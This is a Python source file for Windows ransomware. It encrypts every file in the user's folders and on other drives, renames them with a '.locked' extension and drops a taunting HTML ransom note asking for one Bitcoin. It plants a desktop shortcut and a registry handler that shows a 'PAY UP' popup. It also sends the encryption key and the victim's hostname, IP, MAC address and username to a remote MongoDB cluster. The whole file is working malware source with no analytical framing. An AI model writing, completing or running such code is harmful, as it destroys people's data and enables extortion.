import socket
import platform
import uuid
import os
import winreg as reg
import psutil
import subprocess
import win32com.client
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
from datetime import datetime
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi


def paths():
    dirs = []
    user_dir = os.path.expanduser("~")
    subfolders = [
        "Documents", "Downloads", "Desktop", "Pictures", "Videos", "Music",
        "AppData\\Local", "AppData\\Roaming", "AppData\\LocalLow",
        "AppData\\Temp", "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs",
        "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    ]

    for folder in subfolders:
        path = os.path.join(user_dir, folder)
        if os.path.exists(path):
            dirs.append(path)

    sys_drive = os.getenv("SystemDrive", "C:").upper()
    partitions = psutil.disk_partitions()
    for p in partitions:
        if "cdrom" in p.opts or not os.path.exists(p.mountpoint):
            continue
        drive = p.device
        if not drive.upper().startswith(sys_drive):
            dirs.append(p.mountpoint)

    return dirs


def encryptor(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(file_path, "wb") as f:
            f.write(encrypted)
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")


def dircryptor(paths, key):
    for path in paths:
        for root, _, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                encryptor(file_path, key)


def ranote():
    ransom_path = os.path.join(os.path.expanduser("~"), "Downloads", "ClickME.html")
    with open(ransom_path, "w") as f:
        f.write("""
        <html>
        <head><title>404: Your files are now missing.</title></head>
        <body>
            <h1>Hey Loser!</h1>
            <p>Your files are gone. EVERY. SINGLE. ONE.</p>
            <p>Why? Because you couldn't resist clicking on whatever shiny garbage that came your way.</p>
            <p>No backups</p>
            <p>No antivirus worth a damn</p>
            <p>Still using 'password123' in 2025</p>
            <p><strong>Wanna fix it?</strong></p>
            <p>Send 1 Bitcoin to: <code>bc1qmfmld0305gzc74dvdqjwch3x5flvt56jtn5862</code></p>
            <p>Then, send an apology to: <code>youare@stupid.lol</code></p>
            <p>And maybe, just maybe, we'll think about giving you your files back.</p>
            <p>Haha have fun :)</p>
        </body>
        </html>
        """)
    return ransom_path


def desktop(path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut_path = os.path.join(os.path.expanduser("~"), "Desktop", "ClickME.lnk")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = path
    shortcut.IconLocation = "C:\\Windows\\System32\\shell32.dll"
    shortcut.save()


def machine_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 48, 8)][::-1])

        os_info = platform.platform()

        try:
            username = os.getlogin()
        except:
            username = "Unknown"

        return {
            "hostname": hostname,
            "ip_address": ip_address,
            "mac_address": mac_address,
            "os_info": os_info,
            "username": username
        }
    except Exception as e:
        print(f"Error collecting machine info: {str(e)}")
        return {"error": str(e)}


def rename(target_dirs):
    for path in target_dirs:
        for root, _, files in os.walk(path):
            for file in files:
                original_path = os.path.join(root, file)
                if not original_path.endswith(".locked"):
                    new_path = original_path + ".locked"
                    try:
                        os.rename(original_path, new_path)
                    except Exception as e:
                        print(f"Failed to rename {original_path}: {str(e)}")


def popup(script_path):
    pop = '''import tkinter as tk
from tkinter import messagebox

def show_popup():
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Really?", "You never listen do you?.\\nPAY UP!!!.")
    root.destroy()

if __name__ == "__main__":
    show_popup()
'''
    with open(script_path, "w") as f:
        f.write(pop)


def registry(handler_path):
    try:
        ext = ".locked"
        file_type = "lockedfile"

        reg.CreateKey(reg.HKEY_CLASSES_ROOT, ext)
        key = reg.OpenKey(reg.HKEY_CLASSES_ROOT, ext, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, "", 0, reg.REG_SZ, file_type)
        key.Close()

        reg.CreateKey(reg.HKEY_CLASSES_ROOT, file_type)
        reg.CreateKey(reg.HKEY_CLASSES_ROOT, file_type + r"\shell\open\command")
        cmd_key = reg.OpenKey(reg.HKEY_CLASSES_ROOT, file_type + r"\shell\open\command", 0, reg.KEY_WRITE)
        reg.SetValueEx(cmd_key, "", 0, reg.REG_SZ, f'"{handler_path}" "%1"')
        cmd_key.Close()
    except Exception as e:
        print(f"Failed to create registry entry: {str(e)}")


def atlas(encryption_key):
    uri = "mongodb+srv://hexusseven97:<db_password>@cluster0.ph6xhom.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

    client = MongoClient(uri, server_api=ServerApi('1'))

    try:
        client.admin.command('ping')
        print("Pinged your deployment. You successfully connected to MongoDB!")
    except Exception as e:
        print(f"Connection failed: {str(e)}")
        return

    db = client["Remote"]
    collection = db["python"]

    info = machine_info()
    if "error" in info:
        return

    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    document = {
        **info,
        "encryption_key": encryption_key,
        "state": "secured",
        "sent_at": current_time
    }

    try:
        result = collection.insert_one(document)
        print(f"Document inserted with ID: {result.inserted_id}")
        return result
    except Exception as e:
        print(f"Failed to insert document: {str(e)}")
        return


if __name__ == "__main__":
    key = Fernet.generate_key()
    atlas(key.decode())

    paths_to_encrypt = paths()
    dircryptor(paths_to_encrypt, key)
    rename(paths_to_encrypt)

    ransom_note_path = ranote()
    desktop(ransom_note_path)

    popup_script_path = os.path.join(os.path.expanduser("~"), "popup_warning.py")
    popup(popup_script_path)

    try:
        subprocess.Popen(["python", popup_script_path], shell=True)
    except Exception as e:
        print(f"Failed to run popup script: {str(e)}")

    registry(popup_script_path)
